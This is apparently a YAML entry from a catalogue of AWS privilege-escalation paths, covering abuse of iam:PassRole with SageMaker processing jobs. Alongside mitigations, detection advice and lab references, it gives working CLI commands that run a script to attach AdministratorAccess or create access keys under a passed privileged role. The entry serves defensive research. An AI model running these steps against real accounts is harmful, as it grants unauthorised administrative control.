id: sagemaker-003
name: iam:PassRole + sagemaker:CreateProcessingJob
category: new-passrole
services:
- iam
- sagemaker
description: A principal with `iam:PassRole` and `sagemaker:CreateProcessingJob` can
  create a SageMaker processing job with a privileged execution role. Processing jobs
  can execute arbitrary container code for data processing tasks and access AWS APIs
  with the permissions of the attached IAM role. By creating a processing job with
  a malicious container or processing script, the attacker can execute code with elevated
  privileges.
prerequisites:
  admin:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess)
  - An S3 bucket must be accessible to store input/output data
  lateral:
  - A role must exist that trusts sagemaker.amazonaws.com to assume it
  - An S3 bucket must be accessible to store input/output data
exploitationSteps:
  awscli:
  - step: 1
    command: "echo '#!/usr/bin/env python3\nimport boto3\niam = boto3.client(\"iam\"\
      )\niam.attach_user_policy(\n    UserName=\"YOUR_USERNAME\",\n    PolicyArn=\"\
      arn:aws:iam::aws:policy/AdministratorAccess\"\n)\n' > exploit.py\n"
    description: Create a malicious processing script that attaches AdministratorAccess
      policy to your user
  - step: 2
    command: 'aws s3 cp exploit.py s3://BUCKET_NAME/scripts/exploit.py

      '
    description: Upload the malicious script to S3
  - step: 3
    command: "aws sagemaker create-processing-job \\\n  --processing-job-name privesc-processing\
      \ \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --app-specification\
      \ '{\"ImageUri\":\"683313688378.dkr.ecr.us-east-1.amazonaws.com/sagemaker-scikit-learn:1.0-1-cpu-py3\"\
      ,\"ContainerEntrypoint\":[\"python3\"],\"ContainerArguments\":[\"/opt/ml/processing/input/code/exploit.py\"\
      ]}' \\\n  --processing-inputs '[{\"InputName\":\"code\",\"S3Input\":{\"S3Uri\"\
      :\"s3://BUCKET_NAME/scripts/\",\"LocalPath\":\"/opt/ml/processing/input/code\"\
      ,\"S3DataType\":\"S3Prefix\",\"S3InputMode\":\"File\"}}]' \\\n  --processing-output-config\
      \ '{\"Outputs\":[{\"OutputName\":\"output\",\"S3Output\":{\"S3Uri\":\"s3://BUCKET_NAME/output/\"\
      ,\"LocalPath\":\"/opt/ml/processing/output\",\"S3UploadMode\":\"EndOfJob\"}}]}'\
      \ \\\n  --processing-resources '{\"ClusterConfig\":{\"InstanceCount\":1,\"InstanceType\"\
      :\"ml.t3.medium\",\"VolumeSizeInGB\":10}}'\n"
    description: Create a processing job with the privileged role that executes the
      malicious Python script
  - step: 4
    command: aws sagemaker describe-processing-job --processing-job-name privesc-processing
    description: Monitor the processing job status and wait for execution
recommendation: "High powered service roles + overly permissive `iam:PassRole` is\
  \ what makes this privilege escalation path exploitable and impactful.\n\n- **Avoid\
  \ administrative service roles** - Very rarely does a SageMaker processing job need\
  \ administrative access. Use the principle of least privilege.\n- **Avoid granting\
  \ `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole`\
  \ to specific roles or specific services.\n\nUse IAM policy conditions to restrict\
  \ which roles can be passed and to which services:\n\n```json\n{\n  \"Effect\":\
  \ \"Allow\",\n  \"Action\": \"iam:PassRole\",\n  \"Resource\": \"arn:aws:iam::ACCOUNT_ID:role/SpecificSageMakerRole\"\
  ,\n  \"Condition\": {\n    \"StringEquals\": {\n      \"iam:PassedToService\": \"\
  sagemaker.amazonaws.com\"\n    }\n  }\n}\n```\n\n- Monitor CloudTrail for unusual\
  \ SageMaker processing job creation followed by immediate execution\n- Monitor CloudTrail\
  \ for processing job creation by principals who do not usually create processing\
  \ jobs\n- Monitor CloudTrail for roles being passed to SageMaker that haven't been\
  \ used before\n- Monitor and alert on SageMaker processing job creation with privileged\
  \ roles\n- Regularly audit SageMaker processing jobs for excessive IAM permissions\n\
  - Regularly audit all IAM roles that trust the SageMaker service and down-scope\
  \ any roles with administrative access\n"
limitations: 'This path provides administrative access only if the passed role has
  administrative permissions (e.g., AdministratorAccess or an equivalent custom policy).
  If only limited roles are available, you gain access limited to those permissions.
  However, even limited access may enable multi-hop attacks or access to sensitive
  data.

  '
discoveryAttribution:
  firstDocumented:
    author: Erik Steringer
    organization: NCC Group
    date: 2022
    link: https://github.com/nccgroup/PMapper/blob/master/principalmapper/graphing/sagemaker_edges.py
  derivativeOf:
    pathId: sagemaker-001
    modification: Uses sagemaker:CreateProcessingJob instead of sagemaker:CreateNotebookInstance
      to execute code with the passed role's permissions via a processing container
  ultimateOrigin:
    pathId: sagemaker-001
    author: Spencer Gietzen
    organization: Rhino Security Labs
    date: 2019
    link: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/
references:
- title: AWS Privilege Escalation Methods and Mitigation
  url: https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/
- title: IAM Vulnerable - SageMaker PassRole
  url: https://github.com/BishopFox/iam-vulnerable
- title: HackTricks - AWS - SageMaker Privesc
  url: https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-sagemaker-privesc/index.html#sagemakercreateprocessingjob-iampassrole
relatedPaths:
- sagemaker-001
- sagemaker-002
detectionTools:
  pmapper: https://github.com/nccgroup/PMapper/blob/91d2e60102bdadf346d77b60d90ddaa4a678f037/principalmapper/graphing/sagemaker_edges.py#L82
learningEnvironments:
  iam-vulnerable:
    type: open-source
    githubLink: https://github.com/BishopFox/iam-vulnerable
    scenario: SageMaker-CreateProcessingJobPassRole
    description: Deploy Terraform into your own AWS account and practice individual
      exploitation paths
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: privesc-one-hop/to-admin/iam-passrole+sagemaker-createprocessingjob
    description: Deploy Terraform scenarios individually or in groups, each with attack
      and cleanup scripts
permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section
  - permission: sagemaker:CreateProcessingJob
    resourceConstraints: Must have permission to create SageMaker processing jobs
  additional:
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: 'The starting principal (user or role) with `iam:PassRole` and `sagemaker:CreateProcessingJob`
      permissions. This principal will create a SageMaker processing job with a privileged
      role attached and execute malicious code within the processing job container.

      '
  - id: processing_job
    label: New SageMaker Processing Job
    type: resource
    description: 'The newly created SageMaker processing job configured with a malicious
      processing script. The job is created with `sagemaker:CreateProcessingJob` and
      uses a privileged IAM role via `iam:PassRole`. Processing jobs execute container
      code for data processing tasks and can run arbitrary commands with the permissions
      of the attached role.

      '
  - id: target_role
    label: Existing Role That Trusts the sagemaker Service
    type: principal
    description: 'The privileged IAM role that is passed to the SageMaker processing
      job during creation. This role must trust sagemaker.amazonaws.com as a principal
      in its trust policy. When the processing job executes, it runs with this role''s
      permissions, allowing the malicious script to access AWS APIs.

      '
  - id: execute_script
    label: Execute Malicious Script
    type: payload
    color: '#99ccff'
    description: 'The malicious processing script executes within the SageMaker processing
      job container with the target role''s permissions. The script can perform privileged
      API calls such as creating access keys, modifying IAM policies, or accessing
      sensitive resources. The script output can be written to S3 or the processing
      job logs.

      '
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: 'If the target role has administrative permissions (AdministratorAccess
      or equivalent), the attacker gains full administrative access to the AWS account.
      The malicious script can create access keys for the attacker, modify IAM policies,
      or directly access any AWS resource.

      '
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: 'If the target role has some elevated permissions but not full admin,
      the attacker gains partial privilege escalation. This could include access to
      sensitive data (S3, RDS, DynamoDB), the ability to modify specific resources,
      or permissions that enable additional escalation paths.

      '
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: 'If the target role only has minimal permissions or no interesting
      permissions, the privilege escalation may not provide meaningful additional
      access to the attacker. However, even limited access could be useful for reconnaissance.

      '
  edges:
  - from: start
    to: processing_job
    label: iam:PassRole + sagemaker:CreateProcessingJob
    description: "The attacker creates a SageMaker processing job with a malicious\
      \ processing script and passes a privileged role to it. The script is uploaded\
      \ to S3 and configured as the container entrypoint.\n\nCommands:\n```bash\n\
      # Create malicious script\necho '#!/bin/bash\naws iam create-access-key --user-name\
      \ attacker\n' > process.sh && chmod +x process.sh\n\n# Upload to S3\naws s3\
      \ cp process.sh s3://BUCKET_NAME/processing/process.sh\n\n# Create processing\
      \ job\naws sagemaker create-processing-job \\\n  --processing-job-name privesc-processing\
      \ \\\n  --role-arn arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE \\\n  --app-specification\
      \ ImageUri=IMAGE_URI,ContainerEntrypoint=/opt/ml/processing/input/process.sh\
      \ \\\n  --processing-inputs '[{\"InputName\":\"code\",\"S3Input\":{\"S3Uri\"\
      :\"s3://BUCKET_NAME/processing/\",\"LocalPath\":\"/opt/ml/processing/input\"\
      ,\"S3DataType\":\"S3Prefix\",\"S3InputMode\":\"File\"}}]' \\\n  --processing-outputs\
      \ '[{\"OutputName\":\"output\",\"S3Output\":{\"S3Uri\":\"s3://BUCKET_NAME/output\"\
      ,\"LocalPath\":\"/opt/ml/processing/output\",\"S3UploadMode\":\"EndOfJob\"}}]'\
      \ \\\n  --processing-resources ClusterConfig={InstanceCount=1,InstanceType=ml.m5.large,VolumeSizeInGB=10}\n\
      ```\n\nThe processing job configuration specifies the malicious script as the\
      \ container entrypoint.\n"
  - from: processing_job
    to: target_role
    label: Job assumes role
    description: 'When the SageMaker processing job starts, the SageMaker service
      automatically assumes the target role on behalf of the processing job. The container
      code then executes with all the permissions granted to this role.

      '
  - from: target_role
    to: execute_script
    label: Execute processing script
    description: 'The processing job executes the malicious script with the target
      role''s permissions. The script can access AWS APIs through the role''s credentials,
      which are automatically available to the container via the AWS SDK or environment
      variables.


      Command to monitor:

      ```bash

      aws sagemaker describe-processing-job --processing-job-name privesc-processing

      ```


      The attacker monitors the job status and retrieves output from S3 or CloudWatch
      logs.

      '
  - from: execute_script
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: 'If the target role has AdministratorAccess or equivalent administrative
      permissions, the attacker gains full control over the AWS account. The malicious
      script can create access keys for the attacker, modify IAM policies to grant
      persistent access, or directly access any AWS resource.

      '
  - from: execute_script
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: 'If the target role has elevated but non-administrative permissions,
      the attacker gains partial privilege escalation. This might include access to
      sensitive data stores (S3 buckets, RDS databases, DynamoDB tables), permissions
      to modify specific resources, or the ability to pursue additional privilege
      escalation techniques.

      '
  - from: execute_script
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: 'If the target role only has minimal or non-sensitive permissions,
      the privilege escalation may not yield meaningful additional access. However,
      the attacker could still use the processing job for reconnaissance or as part
      of a multi-step attack chain.

      '
